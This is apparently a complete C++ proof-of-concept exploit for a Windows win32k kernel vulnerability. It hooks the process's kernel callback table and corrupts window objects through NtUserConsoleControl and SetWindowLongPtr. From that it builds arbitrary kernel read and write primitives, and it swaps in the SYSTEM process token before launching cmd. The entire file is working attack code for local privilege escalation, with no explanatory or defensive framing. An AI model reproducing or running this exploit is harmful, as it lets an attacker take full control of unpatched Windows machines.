#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>

typedef NTSTATUS(*pNtCallbackReturn)     (PVOID Result OPTIONAL, ULONG ResultLength, NTSTATUS Status);
typedef NTSTATUS(*pNtUserConsoleControl) (ULONG64 ConsoleCtrl, PVOID ConsoleCtrlInfo, ULONG ConsoleCtrlInfoLength);
typedef ULONG64(*pHMValidateHandle)      (HMENU hMenu, BYTE hType);
typedef VOID(*pCallBack)                 (PULONG32 para);

namespace global
{
	ULONG32 magicNum = 0xabcd;
	ULONG64 fakeSpmenu = 0, oldSpmenu = 0;
	BOOL flag = FALSE;
	HWND hWnds[100] = { 0 };
	ULONG64 pWnds[100] = { 0 };
	ULONG64 heap = 0, desktopHeapBase = 0;
	HWND hWnd0 = 0, hWnd1 = 0, hwnd2 = 0;
	ULONG64 pWnd0 = 0, pWnd1 = 0, pwnd2 = 0;
	ULONG64 wnd0Offset8 = 0, wnd1Offset8 = 0, wnd2Offset8 = 0, wnd0Offset128 = 0, wnd1Offset128 = 0;
	ULONG64 wnd0Offsetc8 = 0;
	CONST ULONG64 dwStyleOffset = 0x18, spmenuOffset = 0x98, cbWndExtra = 0xc8, pExtraBytes = 0x128;
	pCallBack orginCallBack = nullptr;
	pHMValidateHandle HMValidateHandle = nullptr;
	pNtCallbackReturn NtCallbackReturn = nullptr;
	pNtUserConsoleControl NtUserConsoleControl = nullptr;
}

void ErrorOutput(const char* msg)
{
	printf(msg);
	printf("[-] Error code: %d\n", GetLastError());
	exit(1);
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

void GetFunction()
{
	HMODULE hNtdll = LoadLibraryA("ntdll.dll"), hWin = LoadLibraryA("win32u.dll"), hUser = LoadLibraryA("user32.dll");

	if (!hNtdll || !hWin || !hUser)
	{
		ErrorOutput("[-] Failed to load the ntdll.dll, win32u.dll, user32.dll\n");
	}

	global::NtCallbackReturn = (pNtCallbackReturn)GetProcAddress(hNtdll, "NtCallbackReturn");
	global::NtUserConsoleControl = (pNtUserConsoleControl)GetProcAddress(hWin, "NtUserConsoleControl");
	if (!global::NtCallbackReturn || !global::NtUserConsoleControl)
	{
		ErrorOutput("[-] Failed to get NtCallbackReturn, NtUserConsoleControl\n");
	}

	PBYTE isMenu = (PBYTE)GetProcAddress(hUser, "IsMenu");
	if (!isMenu)
	{
		ErrorOutput("[-] Failed to get NtCallbackReturn, NtUserConsoleControl\n");
	}

	while (*isMenu++ != 0xe8);
	global::HMValidateHandle = (pHMValidateHandle)(isMenu + 4 + (*(PLONG32)isMenu));

	if (!global::HMValidateHandle)
	{
		ErrorOutput("[-] Failed to get HMValidateHandle\n");
	}
}

void FakeCallBack(PULONG32 para)
{
	if (*para == global::magicNum && global::flag)
	{
		// search the target memory to get handle
		for (ULONG32 idx = 2; idx < 100; ++idx)
		{
			if (*(PULONG64)(global::pWnds[idx] + 0xc8) == global::magicNum)
			{
				global::hwnd2 = (HWND) * (PULONG64)global::pWnds[idx];
				global::pwnd2 = global::pWnds[idx];
				global::wnd2Offset8 = *(PULONG64)(global::pwnd2 + 8);
				printf("[+] Find the target wnd2 handle: 0x%I64x\n", (ULONG64)global::hwnd2);
				printf("[+] Find the target wnd2 address: 0x%I64x\n", (ULONG64)global::pWnds[idx]);
				break;
			}
		}

		// set flag
		ULONG64 buffer1[2] = { (ULONG64)global::hwnd2, 0 };
		global::NtUserConsoleControl(6, buffer1, 0x10);

		// set offset
		ULONG64 buffer2[3] = { global::wnd0Offset8, 0, 0 };
		global::NtCallbackReturn(buffer2, 0x18, 0);
	}

	return global::orginCallBack(para);
}

void HookCallBack()
{
	ULONG64 KernelCallbackTable = *(PULONG64)(__readgsqword(0x60) + 0x58);//gs:60(PEB)
	if (!KernelCallbackTable)
	{
		printf("[-] Failed to get kernel callback table\n");
		exit(1);
	}

	DWORD oldProtect = 0;
	ULONG64 target = KernelCallbackTable + (0x7B * 8);

	// unprotect callback table
	VirtualProtect((LPVOID)target, 0x100, PAGE_EXECUTE_READWRITE, &oldProtect);

	global::orginCallBack = (pCallBack)(*(PULONG64)target);
	*(PULONG64)target = (ULONG64)FakeCallBack;

	// reprotect callback table
	VirtualProtect((LPVOID)target, 0x100, oldProtect, &oldProtect);
}

void InitWindows()
{
	WNDCLASSA wc{ 0 };
	wc.lpfnWndProc = WindowProc;
	wc.hInstance = GetModuleHandleA(nullptr);
	wc.lpszClassName = "Normal";
	wc.cbWndExtra = 0x1234;

	ATOM normalClass = RegisterClassA(&wc);
	if (!normalClass)
	{
		ErrorOutput("[-] Failed to register normal class\n");
	}

	wc.lpszClassName = "Magic";
	wc.cbWndExtra = global::magicNum;
	ATOM magicClass = RegisterClassA(&wc);
	if (!magicClass)
	{
		ErrorOutput("[-] Failed to register magic class\n");
	}

	CreatePopupMenu();

	// create 40 windows
	for (ULONG32 idx = 0; idx < 100; ++idx)
	{
		HMENU hMenu = CreateMenu();
		if (!hMenu)
		{
			ErrorOutput("[-] Failed to create normal menu\n");
		}

		global::hWnds[idx] = CreateWindowExA(0x8000000, "Normal", "NormalWnd", 0x8000000, 0, 0, 0, 0, 0, hMenu, GetModuleHandleA(nullptr), nullptr);
		if (!global::hWnds[idx])
		{
			ErrorOutput("[-] Failed to create normal window\n");
		}

		global::pWnds[idx] = global::HMValidateHandle((HMENU)global::hWnds[idx], 1);
	}

	// free 2 ~ 39 windows
	for (ULONG32 idx = 2; idx < 100; ++idx)
	{
		if (global::hWnds[idx])
		{
			DestroyWindow(global::hWnds[idx]);
		}
	}

	// define window0, window1 and get offset8
	ULONG64 offset0 = *(PULONG64)(global::pWnds[0] + 8), offset1 = *(PULONG64)(global::pWnds[1] + 8);
	if (offset0 > offset1)
	{
		global::hWnd0 = global::hWnds[1];
		global::hWnd1 = global::hWnds[0];

		global::pWnd0 = global::pWnds[1];
		global::pWnd1 = global::pWnds[0];
		
	}
	else
	{
		global::hWnd0 = global::hWnds[0];
		global::hWnd1 = global::hWnds[1];

		global::pWnd0 = global::pWnds[0];
		global::pWnd1 = global::pWnds[1];

	}

	global::wnd0Offset8 = *(PULONG64)(global::pWnd0 + 8);
	global::wnd1Offset8 = *(PULONG64)(global::pWnd1 + 8);
	global::wnd0Offsetc8 = *(PULONG64)(global::pWnd0 + 0xC8);

	printf("[+] Window0 handle: 0x%I64x\n[+] Window0 address: 0x%I64x\n", (ULONG64)global::hWnd0, (ULONG64)global::pWnd0);
	printf("[+] Window1 handle: 0x%I64x\n[+] Window1 address: 0x%I64x\n", (ULONG64)global::hWnd1, (ULONG64)global::pWnd1);

	// set window0's flag
	ULONG64 buffer1[2] = { (ULONG64)global::hWnd0, 0 };
	global::NtUserConsoleControl(6, buffer1, 0x10);

	// get offset128
	global::wnd0Offset128 = *(PULONG64)(global::pWnds[0] + global::pExtraBytes);
	global::wnd1Offset128 = *(PULONG64)(global::pWnds[1] + global::pExtraBytes);
}

void CreateFakeSpmenu()
{
	global::fakeSpmenu = (ULONG64)malloc(0xA0);
	memset((PVOID)global::fakeSpmenu, 0, 0xA0);

	ULONG64 heap_200 = (ULONG64)malloc(0x200);
	memset((PVOID)heap_200, 0, 0x200);

	ULONG64 heap_30 = (ULONG64)malloc(0x30);
	memset((PVOID)heap_30, 0, 0x30);
	
	global::heap = (ULONG64)malloc(0x10);
	memset((PVOID)global::heap, 0, 0x10);

	ULONG64 heap2_10 = (ULONG64)malloc(0x10);
	memset((PVOID)heap2_10, 0, 0x10);

	*(PULONG64)(global::fakeSpmenu + 0x98) = heap2_10;
	*(PULONG64)(heap2_10) = heap_200;
	*(PULONG64)(heap2_10 + 0x8) = 0x10;
	*(PULONG32)(heap_30 + 0x2c) = 0x10;
	*(PULONG64)(heap_200) = 0x6161616161616161;
	*(PULONG64)(heap_200 + 0x28) = heap_30;
	*(PULONG32)(heap_200 + 0x40) = 1;
	*(PULONG32)(heap_200 + 0x44) = 1;
	*(PULONG64)(heap_200 + 0x58) = global::heap;

	
	printf("[+] Fake spmenu: 0x%I64x\n", global::fakeSpmenu);
}

void TriggerBug()
{
	// trigger the bug
	global::flag = TRUE;
	HMENU hMenu = CreateMenu();
	HWND hMagic = CreateWindowExA(0x8000000, "Magic", "MagicWnd", 0x8000000, 0, 0, 0, 0, 0, hMenu, GetModuleHandleA(nullptr), nullptr);
	if (!hMagic)
	{
		ErrorOutput("[-] Failed to create magic window\n");
	}
	
	
	// set the window0's pExtraBytes
	SetWindowLongPtr(global::hwnd2, global::pExtraBytes, global::wnd0Offset8);

	// set the window0's cbWndExtra
	SetWindowLongPtr(global::hwnd2, global::cbWndExtra, 0xFFFFFFF);

	// set the window1's dwStyle
	ULONG64 oldStyle = *(PULONG64)(global::pWnd1 + 0x18);
	ULONG64 newStyle = oldStyle ^ 0x4000000000000000;
	SetWindowLongPtr(global::hWnd0, global::wnd1Offset8 - global::wnd0Offset8 + global::dwStyleOffset, newStyle);

	// set the window1's spmenu
	global::oldSpmenu = SetWindowLongPtr(global::hWnd1, GWLP_ID, global::fakeSpmenu);

	// recover the window1's dwStyle
	SetWindowLongPtr(global::hWnd0, global::wnd1Offset8 - global::wnd0Offset8 + global::dwStyleOffset, oldStyle);
}

// Write 8 bytes
ULONG64 WriteData(ULONG64 address, ULONG64 value)
{
	ULONG64 oldValue = SetWindowLongPtr(global::hWnd0, global::wnd1Offset8 - global::wnd0Offset8 + global::pExtraBytes, address);
	SetWindowLongPtr(global::hWnd1, 0, value);
	return oldValue;
}

// Read 8 bytes
ULONG64 ReadData(ULONG64 address)
{

	MENUBARINFO mbi{ 0 };
	mbi.cbSize = sizeof(MENUBARINFO);

	*(PULONG64)(global::heap) = address - 0x48;
	GetMenuBarInfo(global::hWnd1, -3, 1, &mbi);

	ULONG32 lowDword = mbi.rcBar.right - mbi.rcBar.left;
	ULONG32 highDword = mbi.rcBar.bottom - mbi.rcBar.top;
	ULONG32 data[2] = { lowDword , highDword };
	ULONG64 result = *(PULONG64)data;

	return result;
}

void StealToken()
{
	printf("[+] Old spmenu: 0x%I64x\n", global::oldSpmenu);

	ULONG64 pTagDesktop = ReadData(global::oldSpmenu + 0x50);
	printf("[+] pTagDesktop: 0x%I64x\n", pTagDesktop);

	ULONG64 pDeskNext = ReadData(pTagDesktop + 0x18);
	printf("[+] pDeskNext: 0x%I64x\n", pDeskNext);

	ULONG64 pTagWin32Heap = ReadData(pDeskNext + 0x80);
	global::desktopHeapBase = pTagWin32Heap;
	printf("[+] pTagWin32Heap: 0x%I64x\n", pTagWin32Heap);

	ULONG64 pTagThreadInfo = ReadData(pTagDesktop + 0x10);
	printf("[+] pTagThreadInfo: 0x%I64x\n", pTagThreadInfo);

	ULONG64 pKthread = ReadData(pTagThreadInfo);
	printf("[+] pKthread: 0x%I64x\n", pKthread);

	ULONG64 pEprocess = ReadData(pKthread + 0x220);
	ULONG64 pCurEprocess = pEprocess;
	ULONG64 token = 0, pid = 0;
	while (true)
	{
		pid = ReadData(pEprocess + 0x2e8);
		if (pid == 4)
		{
			token = ReadData(pEprocess + 0x360);
			WriteData(pCurEprocess + 0x360, token);
			break;
		}
		pEprocess = ReadData(pEprocess + 0x2f0) - 0x2f0;
	}

	printf("[+] Current process token: 0x%I64x\n", token);
}

void RestoreWindow()
{
	// set the window2's pExtraBytes
	SetWindowLongPtr(global::hWnd0, global::wnd1Offset8 - global::wnd0Offset8 + global::pExtraBytes, global::desktopHeapBase + global::wnd2Offset8);
	SetWindowLongPtr(global::hWnd1, global::pExtraBytes, 0);

	// set the window2's flag
	ULONG64 flag = *(PULONG64)(global::pwnd2 + 0xe8) ^ 0x800;
	SetWindowLongPtr(global::hWnd1, 0xe8, flag);

	// recover the window1's pExtraBytes
	SetWindowLongPtr(global::hWnd0, global::wnd1Offset8 - global::wnd0Offset8 + global::pExtraBytes, global::wnd1Offset128);

	// set the window1's dwStyle
	ULONG64 oldStyle = *(PULONG64)(global::pWnd1 + 0x18);
	ULONG64 newStyle = oldStyle ^ 0x4000000000000000;
	SetWindowLongPtr(global::hWnd0, global::wnd1Offset8 - global::wnd0Offset8 + global::dwStyleOffset, newStyle);

	// set the window1's spmenu
	global::oldSpmenu = SetWindowLongPtr(global::hWnd1, GWLP_ID, global::oldSpmenu);

	// recover the window1's dwStyle
	SetWindowLongPtr(global::hWnd0, global::wnd1Offset8 - global::wnd0Offset8 + global::dwStyleOffset, oldStyle);

	// recover the window0's cbWndExtra
	SetWindowLongPtr(global::hWnd0, global::cbWndExtra, global::wnd0Offsetc8);

	// recover the window0's pExtraBytes
	SetWindowLongPtr(global::hWnd0, global::pExtraBytes, global::wnd0Offset128);
}

int main()
{
	GetFunction();

	HookCallBack();
	
	InitWindows();

	CreateFakeSpmenu();

	TriggerBug();

	StealToken();

	RestoreWindow();

	system("cmd");

	return 0;
}